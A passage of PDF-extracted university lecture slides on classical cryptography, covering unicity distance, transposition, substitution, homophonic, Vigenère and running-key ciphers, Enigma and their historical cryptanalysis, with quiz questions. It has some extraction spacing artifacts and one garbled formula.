Ø The actual rate of a language (r) is defined as the average number of bits of information per character in the language. • It is essentially the entropy per character. Ø We can calculate it by defining the rate per character for all N c haracter strings r N an d looking at the trend as N gets larger. Ø We can define it in terms of entropy as: r N = H(X) / N • where X is the set of all messages of length N using characters in the language. The Actual Rate of a Language


<!-- Page 89 -->

Ø As N i ncreases , the rate decreases because there are fewer choices and some choices are more likely. • This decrease tapers off quickly to a constant value. Ø In English, r N is between 1. 0 a nd 1.5 bits per character for large N . Ø r is the value of r N wh en N is large. Ø T h i s c ou r s e w i l l a s s u m e r = 1. 5 f o r E ng l i s h . The Actual Rate of a Language


<!-- Page 90 -->

Ø The redundancy (D) of a language is defined as : D = R - r Ø In English, D = 3.7 .. 3.2. We will use 3.2 . à This corresponds to 68% redundancy. Ø The redundancy comes from • Uneven single - letter distribution; • Uneven digram (2 - letter) frequency; • Uneven trigram (3 - letter) frequency. Ø By deleting vowels and double letters: mst ids cn b xprsd n fwr ltrs, bt th xprnc s mst nplsnt . The Redundancy of a Language


<!-- Page 91 -->

Ø We are now in a position to ask an interesting question. Ø If we decode some cipher text to produce plain text, how can we tell whether we have succeeded ? • If the text reads as English rather than gibberish then we are part of the way there. • On the other hand, could we have produced a seemingly meaningful message by accident? Ø How many characters of cipher text do we need to be sure that a seemingly good decrypted message is the real one ? Ø This number is called the unicity distance . Unicity Distance


<!-- Page 92 -->

Ø A s s u m e we h a ve a n a l p h a b e t of L s y m bo l s . Ø T he nu m b e r of p o ss i b l e m es s a g e s o f l e n g t h N i s : L N = (2 R ) N = 2 RN since L = 2 R Ø The number of meaningful messages can be expressed in terms of the rate for the language and is 2 rN Ø If we assume that all messages are equally likely, then the probability of getting a meaningful message by chance is : Unicity Distance 𝑛𝑢𝑚𝑏𝑒𝑟 𝑜𝑓 𝑎𝑝𝑝𝑎𝑟𝑒𝑛𝑡𝑙𝑦 𝑚𝑒𝑎𝑛𝑖𝑛𝑔𝑓𝑢𝑙 𝑚𝑒𝑠𝑠𝑎𝑔𝑒𝑠 𝑛𝑢𝑚𝑏𝑒𝑟 𝑜𝑓 𝑝𝑜𝑠𝑠𝑖𝑏𝑙𝑒 𝑚𝑒𝑠𝑠𝑎𝑔𝑒𝑠 = 2 !" 2 #" = 2 ! $ # " = 2 $ %"


<!-- Page 93 -->

Ø Try all possible keys and keep those that look right. • An exhaustive search or brute force attack. Ø Le t K b e t he s e t o f a l l p o ss i b l e k e y s . Ø Now the number of keys is 2 H(K) • We must use the entropy of the keyspace, since the chosen key values may exhibit some redundancy. Ø So , the expected number of wrong keys is : • o = 2 H(K) – 1, approximately 2 H(K) • Where we assume there are a lot of possible keys, all but one of which is wrong. The Keyspace


<!-- Page 94 -->

Ø The expected number of false solutions that look like they might be right : ( number of wrong keys ) x ( probability of chance meaningful message ) = 2 H(K) x 2 - DN = 2 H(K) - DN Ø This is a rapidly decreasing function of N . Ø We can define the value of message length N a t the crossover point when the exponent = 0 as the unicity distance N u : H(K) – D N u = 0 (crossover point, exponent = 0), à N u = H(K)/D (unicity distance) The Keyspace


<!-- Page 95 -->

Ø If N > N u then the chance of getting a false positive is negligible since the number of correct - looking false messages is much less than 1 . Ø On the other hand, if N < N u then many of the correct - looking messages will be false . Ø N u is roughly the number of characters needed to unambiguously break the code and determine the key. Unicity Distance


<!-- Page 96 -->

Ø The DES encryption algorithm has a key length of 56 bits . If the keys are chosen at random then the entropy H(K) = 56 . Ø Assume an English language document is encrypted and that one byte is used for each letter . à T h u s , R = 8 a nd h e n c e D = R – r = 6. 5 . à Hence , N u = H(K) / D = 56 / 6.5 = 8.6 Ø So , we need to decode about 9 l etters to make sure that a message that looks like English is the real message. Data Encryption Standard (DES): Example


<!-- Page 97 -->

Ø Reducing the value of D increased the unicity distance, and so makes it harder to break the code. • More characters are needed before an unambiguous solution is found . Ø If the plain text were nearly random, and so D is very small, then the real message would be hard to tell apart from the actual random text. Ø Compressing a message before encrypting will increase the unicity distance . Reducing Redundancy


<!-- Page 98 -->

Ø The preceding model assumes a random encryption system . Ø In particular, there is no relationship between: • similar keys and the cipher text . • similar plaintext and the ciphertext . Ø The unicity distance is less if the encryption is non - random . The Random Assumption


<!-- Page 99 -->

Ø This random concept is usually expressed in two terms: confusion and diffusion . Ø An encryption system has good confusion if changing one bit in the key changes roughly half the bits of the ciphe r text. Ø An encryption system has good diffusion if changing one bit in the plaintext changes roughly half the bits of the ciphertext . Confusion and Diffusion


<!-- Page 100 -->

Ø The unicity distance does not provide a way of breaking the code . Ø It just indicates how much information we need to gather before we can attempt to break it . Ø It is based on the rate for a language, a statistical property, which is less valid for very short character strings. The usefulness of Unicity Distance


<!-- Page 101 -->

1. Define the term "The entropy of a set of messages" and show how it can be calculated. A language contains 5 symbols: A, B, C, D and E. A, B, C each occur ¼ of the time, while D and E occur 1/8 of the time. What is the entropy of this language? 2. Define the term "unicity distance." What information is needed to calculate it, and how useful is the concept of unicity distance ? A newly invented language has 16 different symbols in its alphabet and is quite precise. On average each letter in the alphabet conveys 2 bits of information . A message in this language is encrypted with an 8 - character key . It is known that users will choose English language keys all in lowercase . What is the unicity distance of these encrypted messages? Quizzes


<!-- Page 102 -->

Lecture Summary


<!-- Page 103 -->

Ø The entropy of a system with many possible messages is the minimum number of bits needed to code all possible different messages. • It depends on the probability of each message occurring. H (X) = S p (x i ) log 2 (1/p(x i )) Ø This tells us how many items we need to search using a brute force attack (checking all possibilities) • 2 H(X) Information Theory


<!-- Page 104 -->

Ø If we know the number of bits used to convey any possible message s we can calculate • R, the absolute rate, assuming all messages are equally likely • r, the actual rate based on the probabilities of each message occurring in real life. • D = R - r, the redundancy of the message system Ø If there is high redundancy then we can use a statistical attack, assuming a message is one of the likely ones . Ø A brute force attack can produce possible plaintext messages which are wrong • They only look right by chance . Ø The unicity distance tells us how many ciphertext letters we need to get to prevent these false positives. Information Theory


<!-- Page 105 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 106 -->

Lecture 2: Traditional Encryption and Decryption schemes


<!-- Page 107 -->

Lecture Outline 1. Types of Attack – Threats that need to be protected against. 2. Transposition and substitution ciphers. 3. Homophonic Ciphers – Plaintext letters can have several ciphertext letters. 4. Polyalphabet Ciphers and Rotor Machines. – Mechanical encryption devices. 5. Running Key Ciphers – The key is the same length as the plaintext


<!-- Page 108 -->

Types of Attack


<!-- Page 109 -->

► Covers the time period up to the invention of the electronic computer. ► All traditional encryption schemes are single - key systems , with two main variations. Ø Transposition ciphers , where the characters are rearranged. Ø Substitution ciphers , where the characters are substituted. ► Transposition and substitution can be combined. Traditional Encryptions


<!-- Page 110 -->

► Attempts to break the code normally depend on the information available. 1. Ciphertext Only 2. Known plaintext – Know part of the message (i.e., plaintext) as well as the cipher text and use this information to find the key. 3. Chosen plaintext – Plant some plaintext and examine the cipher text to find the key. Types of Attack


<!-- Page 111 -->

► Brute force (exhaustive search) o Try all possible keys. ► Letter frequency. o Use the letter frequencies in the cipher text. ► Di - gram and tri - gram frequencies o Frequencies of pairs and triples of characters in the cipher text. ► The following slide shows the letter frequencies: totals and occurrences per 1000 letters from the file dracula.txt . ► Some letters are much more frequent than others. Types of Attack: Methods


<!-- Page 112 -->

a --- 52337 82 n --- 43597 68 b --- 8987 14 o --- 50331 79 c --- 13516 21 p --- 9158 14 d --- 28539 45 q --- 625 1 e --- 79302 124 r --- 34951 55 f --- 13991 22 s --- 39484 62 g --- 12670 20 t --- 58123 91 h --- 43201 68 u --- 17923 28 i --- 42602 67 v --- 5871 9 j --- 813 1 w --- 18057 28 k --- 6201 10 x --- 781 1 l --- 26115 41 y --- 12671 20 m --- 17758 28 z --- 351 1 Letters Statistic in dracular.txt


<!-- Page 113 -->

► A good encryption system will try to make sure that there is little relationship between plaintext letters, the key, and ciphertext letters. ► In particular, small changes to the plaintext or the key should produce large changes to the ciphertext . ► An encryption system has good confusion if changing one bit in the key changes roughly half the bits of the ciphertext. ► An encryption system has good diffusion if changing one bit in the plaintext changes roughly half the bits of the ciphertext. Confusion and Diffusion


<!-- Page 114 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 115 -->

Lecture 2: Traditional Encryption and Decryption schemes


<!-- Page 116 -->

Lecture Outline 1. Types of Attack – Threats that need to be protected against. 2. Transposition and Substitution ciphers. 3. Homophonic Ciphers – Plaintext letters can have several ciphertext letters. 4. Polyalphabet Ciphers and Rotor Machines. – Mechanical encryption devices. 5. Running K ey Ciphers – The key is the same length as the plaintext


<!-- Page 117 -->

Transposition Ciphers


<!-- Page 118 -->

Ø Split characters into blocks of fixed length d . Ø Rearrange the characters inside a block according to a key - dependent permutation . Ø Decryption uses the inverse permutation to recover the original text (i.e., plaintext). Ø We can define the permutation by a table, e.g. • 0 → 1, 1 → 3, 2 → 0, 3 → 2. Ø It is shorter to list the destination positions in order. • (1, 3, 0, 2) or 1302 Ø The inverse permutation is • (2, 0, 3, 1) or 2031 Transposition Ciphers


<!-- Page 119 -->

Ø Starting with the text • securityandcryptography Ø Arrange it in blocks of 4 characters • secu rity andc rypt ogra phy Ø Encrypting the text with the above permutation yields • csue tryi dacn prty roag yph . Ø Note that we have to do something with the short final block of only 3 letters. – We redefine the permutation for just 3 letters by making 3 in the ciphertext go to 2. – Encryption permutation = 120 , decryption = 201 . Transposition Ciphers: Example


<!-- Page 120 -->

Ø The first step in calculating the Unicity Distance is to examine the “ key - space ” in more detail. Ø Assume that all permutations are equally likely. – Thus, t here are d! possible permutations for an encryption with block length d : d! = d x (d - 1) x (d - 2) x … x 1 . d p o s i t io ns fo r 1 s t l e tt e r , (d - 1 ) fo r se c o nd a nd s o o n . Ø d ! i s v e ry l a r g e fo r m od e r a t e v a l u e s o f d . Unicity Distance


<!-- Page 121 -->

Ø The entropy of the key space is log 2 (d!). – Assume all permutations are equally likely. Ø We can estimate this using Stirling' approximation for the factorial function : log e (n!) » (n + 1/2) log e (n) - n Now: log 2 (x) = log 2 (e) ´ log e (x) = 1.4427 log e (x) Ø I f d = 2 5 t h e n H(K ) = 8 3.676 7 – There are a lot of possible keys. Ø Hence N u = 83.6767 / 3.2 = 26 – 3.2 is t he r e d u n d a n c y o f E n g li s h. Unicity Distance


<!-- Page 122 -->

Ø This transposition algorithm can result in good confusion. – It all depends on the way the notation for the key is related to the permutation. Ø Diffusion is poor because the plaintext bits are shuffled round in character - sized blocks. – Replacing the first s in the plaintext by a t does not change the ciphertext very much. Confusion and Diffusion


<!-- Page 123 -->

Ø Consider the “ Ciphertext only attack ”. • The only information we have is the ciphertext. Ø Observation: the letter frequencies in the ciphertext remain the same as those for the plain text. • This is a good indication that a transposition cipher is being used. Ø The order of the letters has been changed, and the original order can be recovered by the use of anagramming techniques . • This is greatly helped by the use of di - gram and tri - gram frequency tables , showing which letter pairs are common, and also which pairs never occur. Breaking the Cipher


<!-- Page 124 -->

Ø Start by guessing that the permutation length is 4, then look for clues in the blocks. csue tryi dacn prty roag yph Ø Notice that the third block contains the letters for a - n - d , a very common tri - gram . Ø If this block contained the word " and ", there would be only two possible permutations. – c is t he f i r s t l et t e r i n t he bl o c k " can d " ( 2 130 ) – c is t he l as t l e t t e r i n t he b l o c k " and c " ( 13 0 2) . Breaking Cipher: Example


<!-- Page 125 -->

Ø Making c the first letter in the block leads to usec yrit cand tryp aogr phy Ø It is quite hard to automatically detect that this is wrong. Ø Making c the last letter of the block leads to the correct plaintext. Ø This approach has reduced the number of possible keys that we need to consider. Breaking Cipher: Example


<!-- Page 126 -->

The plaintext and ciphertext both use an alphabet of 32 characters, the 26 letters of the alphabet and 6 punctuation characters. o Encryption consists of taking the characters in blocks of 5 and rearranging them to form the cipher text. o The rearrangement permutation is the key, and the inverse permutation is used to decrypt. 1. Why is this not a two - key system, since different permutations are used to encrypt and decrypt? 2. If a ciphertext - only attack were used to try and break the encryption, how many letters of ciphertext would be needed? 3. Suggest a mechanism for dealing with messages that are not an exact multiple of 5 letters long. Quizzes


<!-- Page 127 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 128 -->

Lecture 2: Traditional Encryption and Decryption schemes


<!-- Page 129 -->

Lecture Outline 1. Types of Attack – Threats that need to be protected against. 2. Transposition and Substitution ciphers. 3. Homophonic Ciphers – Plaintext letters can have several ciphertext letters. 4. Polyalphabet Ciphers and Rotor Machines. – Mechanical encryption devices. 5. Running key Ciphers – The key is the same length as the plaintext


<!-- Page 130 -->

Substitution Ciphers


<!-- Page 131 -->

Ø Substitution ciphers provide matching between letters in the plaintext alphabet to other letters in the same or a different alphabet for the cipher text. – Two types: Shift Substitution and Multiplicative Substitution Ø In the simple case, each English letter is replaced by another English letter. Ø In more complex cases, English letters can be replaced by letters in another alphabet. Ø There can even be more letters in the cipher text alphabet than there are in the plaintext alphabet. – Some letters in the plaintext can be replaced by a choice of different letters in the ciphertext. Substitution Ciphers


<!-- Page 132 -->

Ø This example assumes the letters are replaced by numbers: a=0,b=1,c=2,d=3,e=4,f=5,g=6,h=7,i=8,j=9, k=10,l=11,m=12,n=13,o=14,p=15,q=16,r=17,s=18, t=19,u=20,v=21,w=22,x=23,y=24,z=25 . Ø A shift substitution shifts each letter of the alphabet along by a fixed amount, with a wrap - around at the end. The formula is: • c = (p + k) % n where c is the cipher letter, p is the plain text, n is the size of the alphabet and k (i.e., the secret key) is the number of characters to shift. Ø Decryption uses the inverse transformation • p = (c - k) % n Shift Substitution


<!-- Page 133 -->

Ø An early example of a shift substitution is the Caesar cipher with k = 3 Ø This confused the Gauls during Caesar's wars. – As reported by Caesar in his own book! Ø The Caesar cipher relied on a secret algorithm, which is usually a bad idea. – But it worked for Caesar. Ø Diffusion is again poor. Why? – Changing one letter in the plaintext only changes one letter in the ciphertext. Example: Caesar Cipher


<!-- Page 134 -->

securityandcryptography becomes vhfxulwbdogfubswrjudskb Ø The letter frequencies have been shifted. Ø We can use the most frequent letters in the ciphertext to guess the shift. – For instance: if the most common letter in the cipher text is h , we guess that it corresponds to a common letter such as e , with a shift of 3 . – This attack works better for longer messages. Example: Caesar Cipher


<!-- Page 135 -->

Ø A multiplicative substitution is slightly more sophisticated, and uses the formula: c = (p ´ k) % n Ø Decryption uses k' , the inverse of k p = (c ´ k') % n, where kk' = 1 (mod n). Ø A more complex version would combine shift and multiplication. c = (p ´ k1 + k2) % n Ø In this case, n should be a prime number , to make sure that all values of k can be used (they must have inverses). Multiplicative Substitution


<!-- Page 136 -->

Ø The Unicity Distance is quite small since there are not many possible keys. – There are 25 keys, assuming shifting with 0 or multiplying with 1 are not used. H(K) = log 2 (25) and so N u = log 2 (25)/3.2 = 1.5 Ø Single - letter frequencies can be used to break these codes quite easily. Ø An exhaustive search (Brute Force) is also possible. – Shift and multiply have 25 2 = 625 possible keys. Breaking the Cipher


<!-- Page 137 -->

General English to English Substitutions Ø The key is a substitution between letters of the alphabet. – There are a large number of different possible substitutions and so keys. Ø The unicity distance calculation is similar to a transposition cipher, and N u = 27 Ø A “ ciphertext - only attack” will then use single - letter frequencies to break the cipher.


<!-- Page 138 -->

Lecture Summary


<!-- Page 139 -->

Transposition and Substitution Ciphers Ø Transposition: – Split characters into blocks of fixed length d . – Rearrange the characters inside a block according to a key - dependent permutation. – Decryption uses the inverse permutation to recover the plaintext. Ø Substitution – Provide a matching between letters in the plaintext alphabet to other letters in the same or a different alphabet for the ciphertext. – Shift Substitution – Multiplicative Substitution


<!-- Page 140 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 141 -->

Lecture 2: Traditional Encryption and Decryption schemes


<!-- Page 142 -->

Lecture Outline 1. Types of Attack – Threats that need to be protected against. 2. Transposition and Substitution ciphers. 3. Homophonic Ciphers – Plaintext letters can have several ciphertext letters. 4. Polyalphabet Ciphers and Rotor Machines. – Mechanical encryption devices. 5. Running key Ciphers – The key is the same length as the plaintext


<!-- Page 143 -->

Homophonic Ciphers


<!-- Page 144 -->

Ø A homophonic cipher matches each letter in the plaintext alphabet to possibly more than one letter in another alphabet used for the ciphertext. Ø For example, English letters in the plaintext to numbers between 0 a nd 127 i n t he c ip h e r t e x t . – The ciphertext alphabet is numbers between 0 and 127. Ø Each English letter in the plaintext can correspond to several numbers in the cipher t ext. – The key is this match between letters and numbers. – The key can be quite large. Homophonic Cipher


<!-- Page 145 -->

Ø More frequently used letters have more matching characters in the other alphabet. – This severely weakens attacks based on single - letter frequencies Ø It can still be attacked by “ digram frequencies”. Ø The following slide shows how many numbers between 0 and 127 should be allocated to each of the letters in the alphabet, based on the ea r li e r drac u la.txt f r e q u e n c i e s . Ø It also shows the relative frequency of plaintext letters to ciphertext codes. – 1.00 m eans no statistical information can be obtained. Ø Note that just the rare letters contain statistical information, and they are rare, which does not help much. Homophonic Cipher


<!-- Page 146 -->

a --- 10 1.05 n --- 8 1.09 b --- 2 0.90 o --- 10 1.01 c --- 3 0.90 p --- 2 0.92 d --- 6 0.95 q --- 1 0.13 e --- 16 0.99 r --- 7 1.00 f --- 3 0.94 s --- 8 0.99 g --- 2 1.27 t --- 11 1.06 h --- 8 1.08 u --- 4 0.90 i --- 8 1.07 v --- 1 1.18 j --- 1 0.16 w --- 4 0.91 k --- 1 1.24 x --- 1 0.16 l --- 5 1.05 y --- 2 1.27 m --- 3 1.19 z --- 1 0.07 Codes per Letter


<!-- Page 147 -->

Ø The larger the ciphertext alphabet, the more secure the code. Ø In the limit where every plaintext letter is encrypted to a different ciphertext letter, the code cannot be broken – However, the key size is at least as large as the length of the plaintext. Ø The ciphertext alphabet requires more bits to encode each letter. – 26 letters require 5 bits per letter – Numbers between 0 a nd 127 require 7 bits per number. Homophonic Cipher


<!-- Page 148 -->

Letter Homophones (Codes) A 17 19 34 4 56 60 67 83 I 08 22 53 65 88 90 L 03 44 76 N 02 09 15 27 32 40 59 0 01 11 23 28 42 54 70 80 P 33 91 T 05 10 20 29 45 58 64 78 99 Example : English letters are enciphered as integers (0 - 99), a group of integers are assigned to a letter proportional to the relative frequency of the letter, as in the table: M = PLAIN PIL0T (plaintext) C = 91 44 56 65 59 33 08 76 28 78 (ciphertext) Homophonic Cipher: Example


<!-- Page 149 -->

Ø It is possible to encrypt two different plaintext messages of the same length with two different keys to produce a composite ciphertext. Ø Each key will decrypt the ciphertext to produce a different message. – The first key produces the real message. Ø The other message can be innocuous, and the second key is a distress key , to be revealed under duress. – Often called the ‘rubber hose’ decryption technique. Second - Order Homophonic


<!-- Page 150 -->

Ø The plaintext alphabet forms the rows and columns of an n x n matrix. – n is t he n u m b e r o f l e t t e r s i n t he p l a i n t e xt a l ph a b e t . Ø The ciphertext alphabet consists of integers between 0 and n 2 - 1 inclusive – T h e re a re n 2 o f t h e m . Ø The key is the order in which the cipher text letters appear in the matrix. Ø Encryption uses letters from the first message to locate the row (Row F1) and the second message for the column (Column F2). – Thus, each ciphertext character is the number appearing in the appropriate element in the matrix. Second - Order Homophonic: Example


<!-- Page 151 -->

For the Decryption: Ø Decrypting the first message decodes all the numbers in a given row to the same letter Ø Decrypting the second message uses the numbers in a given column to produce the same letter. Second - Order Homophonic


<!-- Page 152 -->

Alphabet of 5 letters EILMS Ø Encryption Matrix: Ø The numbers in the matrix are randomly selected. Ø If the real message is SMILE and the decoy (dummy) message LIMES , then the ciphertext will be: 21, 16, 05, 19, 11 E I L M S E 10 22 18 02 11 I 12 01 00 05 20 L 19 06 23 13 07 M 03 16 08 24 15 S 17 09 21 14 04 Second - Order Homophonic: Example


<!-- Page 153 -->

Ø The real decryption key will be: E(10,22,18,02,11) I(12,01,00,05,20) L(19,06,23,13,07) M(03,16,08,24,15) S(17,09,21,14,04) Ø while the decoy key will be: E(10,12,19,03,17) I(22,01,06,16,09) L(18,00,23,08,21) M(02,05,13,24,14) S (11,20,07,15,04) Ø Note that letter frequencies are not destroyed. Second - Order Homophonic: Example


<!-- Page 154 -->

Ø An isolated civilisation has developed a written language based on an alphabet with just 4 letters: α , β , γ and δ . Their written documents are very long. § The letters do not occur with equal frequency: α occurs 3/8 of the time ; β and γ 1/4 of the time each and δ 1/8 of the time. § The probability of any two - letter combination occurring is, however, just the product of the probability of each letter occurring independently and there are no special digrams or trigrams. Quiz: Calculate the redundancy of this language. You do not need to calculate an exact number but can leave terms like log 2 (3) in your answer. Quizzes


<!-- Page 155 -->

Ø This civilisation is aware of the English language and has decided to encrypt its secret documents by using some English language letters for the ciphertext. Quiz: Show how they can hide the redundancy in their language by using the alphabet {A, B, C, D, E, F, G, H} as the ciphertext alphabet. Ø This civilisation is also investigating the possibility of hiding two different messages in the cipher text, each with its own key. Quiz: How m a ny l e t t e rs fr om t he E n gli s h l a n gu a g e w o u l d be needed? G i ve an example of such an encoding. Explain why this code would be easier to break than the previous one. Quizzes


<!-- Page 156 -->

Lecture Summary


<!-- Page 157 -->

Ø A homophonic cipher has more letters in the ciphertext alphabet than in the plaintext alphabet. – Each plaintext letter can be replaced by a choice of several ciphertext letters (chosen at random). – This reduces the effect of statistics. Ø A second - order homophonic encrypts two different messages, each with its own key, into one piece of cipher text. – An innocent message is protected by a distress key. Homophonic Cipher


<!-- Page 158 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 159 -->

Lecture 2: Traditional Encryption and Decryption schemes


<!-- Page 160 -->

Lecture Outline 1. Types of Attack – Threats that need to be protected against. 2. Transposition and Substitution ciphers. 3. Homophonic Ciphers – Plaintext letters can have several ciphertext letters. 4. Polyalphabet Ciphers and Rotor Machines. – Mechanical encryption devices. 5. Running key Ciphers – The key is the same length as the plaintext


<!-- Page 161 -->

Polyalphabet Ciphers


<!-- Page 162 -->

Ø Polyalphabet substitutions destroy single - letter frequencies by using several different substitutions one after the other. Ø The actual substitution used for each letter is different and depends on the position of the letter in the plaintext as well as its value . Ø The Vigenère cipher is probably the best - known example of a polyalphabetic cipher, though it is a simplified special case. Ø The Enigma machine is more complex but is still fundamentally a polyalphabetic substitution cipher. Polyalphabetic Substitutions


<!-- Page 163 -->

Vigenere /Beaufort Cipher Ø This is a form of shift substitution , where the amount of shift depends on the position of the plaintext letter c i . c i = (p i + k i ) % n Ø The series of keys k 0 , k 1 , k 2 … repeat with a period d .


<!-- Page 164 -->

Ø A simple example has a period of 3 ( d=3 ). • The first letter is shifted 3 ( k 0 =3 ). • The second letter is shifted 7 ( k 1 =7 ). • The third letter is shifted 5 ( k 2 =5 ). Ø The next block of 3 is treated similarly. sec uri tya ndc ryp tog rap hy becomes ( s+3 ® v, e + 7 ® l, c+5 ® h ) vlh xyn wff okh ufu wvl uhu kf . Vigenere /Beaufort Cipher: Example


<!-- Page 165 -->

Kasiski's Method of Attacking Periodic Ciphers Ø The Beaufort cipher will repeat with a period d that is not too long. Ø Look for identical plaintext phrases (typically tri - grams) that are an exact multiple of the period apart. Ø Each phrase will be encoded to form the same cipher text. Ø The message in the example: ( security.and.cryptography ) is not long enough to illustrate this. – Short messages were relatively secure. – However, even in this short message, y is in second position 3 times and always becomes f .


<!-- Page 166 -->

Ø A rotor machine uses different substitutions , each one implemented as a rotor . – It is a mechanical encryption device. Ø Each rotor has a circle of metal contacts on the outside of both left and right faces, one contact for each letter in the alphabet. Ø Each contact on the left face is connected to one on the right face by internal wiring. Ø Several rotors are combined so that each contact on the left face of one rotor presses against a contact on the right face of the next rotor. Ø The input keyboard connects to the corresponding position on the right face of the first rotor. Ø The left face of the last rotor connects to the output device , typically a printer. Ø Depressing a key completes the circuit, printing the cipher character. Rotor Machines: Description


<!-- Page 167 -->

Rotor Diagrams Ø One Enigma rotor Ø Substitutions after left rotor rotates


<!-- Page 168 -->

Ø The rotor positions are changed after each key is input . – In some machines, all the rotors change positions each time . – In other cases, only one rotor moves each time, with the others moving occasionally, similar to the way a car’s mileage is recorded . Ø The key is the starting position of each rotor. Ø T h es e m ac h in e s on l y r e p ea t a f t e r a v e ry lon g p e r io d a nd a re n ot vulnerable to Kisiski’s attack. Ø They have good confusion and diffusion. Rotor Machines


<!-- Page 169 -->

The Enigma Machine Ø This was a three or four - rotor machine (there were several variants). Ø There was also a reflector at one end, a fixed rotor with only one face, with letters connected in pairs. – The current went into the reflector at one letter, – And out at another letter, reflecting back through the other rotors. Ø A plugboard connected several pairs of letters with a wire. It was a simple permutation. Ø When a key was pressed, an electrical circuit was created, connecting the key, a plug board circuit, each rotor, the reflector, each rotor again, and then the printer. Ø The reflector meant that the same setup could be used for encryption and decryption without making any changes.


<!-- Page 170 -->

Ø The key was the choice of rotors and the order in which they were inserted in the machine, together with the plugboard settings . Ø There were a small number of networks (army, navy, air force etc ), and each network used the same key for all traffic for one day . – The key changed daily at midnight . Ø It was highly likely that a large number of documents with the same starting letters would be encrypted with the same key, leading to the same starting cipher text . – Many complete messages would just say “ Nothing to report ” in German, which would lead to identical cipher text . Ø This was prevented by the use of an “ indicator key ” The Enigma Machine: The Keys


<!-- Page 171 -->

Ø The indicator key was another set of three or four letters chosen at random by the operator and different for each message. Ø The operator first encrypted the indicator key using the standard daily settings. Ø He then changed the rotor settings to the indicator key. Ø Then he typed the rest of the message. Ø Thus, two identical plaintext messages were unlikely to result in identical ciphertext messages. The Enigma Machine: Indicator Keys


<!-- Page 172 -->

Ø The Enigma was broken with a brute force attack using a set of mechanical devices called Bombes . Ø It was mainly a known plaintext attack, testing a number of standard phrases, called cribs . – Ma ny m essa g e s s t a r t e d w i t h AN X . “An ” i s G e r m a n f o r To , a n d X wa s used for spaces. • “To General Hoth . . .” – “Ein” , German for 1, appeared in 90% of messages. Ø Many messages contained the German for “Nothing to report”. Breaking The Enigma A wartime picture of a Bletchley Park Bombe


<!-- Page 173 -->

Ø The reflector was a big weakness because it meant that each ciphertext letter was different from the plain text. Ø For instance, – If the cipher text started with ‘A’ , then the plaintext could not be “ANX”. – One code breaker noticed that a ciphertext message did not contain the letter L and correctly deduced that the plain text was LLLLLL ... – This greatly restricted the number of keys that had to be tested. – The bombes would stop if they found a key that produced the crib. – This was usually a false stop because several possible keys could produce the crib (see unicity distance ). – They were checked by hand. Breaking The Enigma


<!-- Page 174 -->

1. Describe how a rotor machine could be used to encrypt a text document, explaining the advantages of using it. 2. Describe the Enigma machine variant of the rotor algorithm, pointing out the weakness incorporated by Enigma. What factors led to the breaking of the Enigma code? 3. It is proposed that a modern mechanical rotor machine would make a useful encryption machine since it does not rely on computer technology, which can be compromised. How many rotors would be needed for secure encryption? Justify your answer. Quizzes


<!-- Page 175 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 176 -->

Lecture 2: Traditional Encryption and Decryption schemes


<!-- Page 177 -->

Lecture Outline 1. Types of Attack – Threats that need to be protected against. 2. Transposition and Substitution Ciphers. 3. Homophonic Ciphers – Plaintext letters can have several ciphertext letters. 4. Polyalphabet Ciphers and Rotor Machines. – Mechanical encryption devices. 5. Running Key Ciphers – The key is the same length as the plaintext


<!-- Page 178 -->

Running Key Ciphers


<!-- Page 179 -->

Ø The key is English text, the same length as the plaintext. Ø The encryption and decryption is then very simple. c i = (p i + k i ) mod n p i = (c i - k i ) mod n Ø This seems to destroy letter frequency analysis and is not periodic, but it can be broken if the key is not chosen well. Running Key Encryption


<!-- Page 180 -->

Ø The key might be based on a book that is available to both the coder and decoder. – Macbeth, Act 2 Scene 3, line 4, says. – That is the starting point for the letters. – This solves the key distribution problem. – The ‘ spy ’ does not need to carry the key with him. The key is very long. Ø This is vulnerable to Friedman's attack because both the key and plain text are English and have redundancy. Literature - based Keys


<!-- Page 181 -->

Friedman's Attack Ø Friedman's approach assumes initially that all ciphertext characters are caused by high - frequency letters in both the plaintext and the key text. – This means that there will only be a few possibilities for each plaintext and key text letter. They must both add up to produce the given ciphertext letter. Ø Digram and trigram frequencies are then used to guess the actual letters used. Ø A significant proportion of the plaintext and ciphertext can be guessed by this approach. Ø The rest can be filled in using natural language redundancy.


<!-- Page 182 -->

Ø Plaintext: – thetreasureisburied . . . Ø Key: – thesecondcipheris . . . Ø Ciphertext: – moilvgofxtmzflz . . . Ø Wh e re t he l e t t e rs a re r e p l a c e d by n u m b e r s , a d d e d m o d u l o 2 6 a n d converted back to letters. a=0,b=1,c=2,d=3,e=4,f=5,g=6,h=7,i=8,j=9, k=10,l=11,m=12,n=13,o=14,p=15,q=16,r=17,s=18, t=19,u=20,v=21,w=22,x=23,y=24,z=25 . Friedman's Attack: Example


<!-- Page 183 -->

